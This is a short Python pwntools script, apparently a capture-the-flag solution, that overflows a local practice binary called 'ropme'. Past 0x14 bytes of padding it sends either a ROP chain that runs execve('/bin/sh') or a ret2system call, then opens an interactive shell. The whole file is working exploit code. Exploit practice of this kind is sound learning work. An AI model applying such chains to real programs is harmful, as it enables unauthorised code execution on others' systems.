from pwn import *

context.log_level = 'ERROR'

p = process('./ropme')

'''
    pop ebx
    xor edx, edx
    xor ecx, ecx
    mov ebx, esp
    mov eax, 0xb
    int 0x80
'''
def shellcode():
    payload = p32(0x0804832d)    # pop_ebx
    payload += p32(0x0804a024)   # binsh
    payload += p32(0x080484b5)   # xor_ecx
    payload += p32(0x080484b8)   # xor_edx
    payload += p32(0x080484bb)   # syscall

    return payload

def system():
    payload = p32(0x080484e3)  # system_plt
    payload += p32(0x0804a024) # /bin/sh

    return payload

exploit = b'A' * 0x14
if args.SHELL:
    exploit += shellcode()
else:
    exploit += system()

p.sendlineafter(b'It\'s time to ROP!\n', exploit)
p.interactive()
p.close()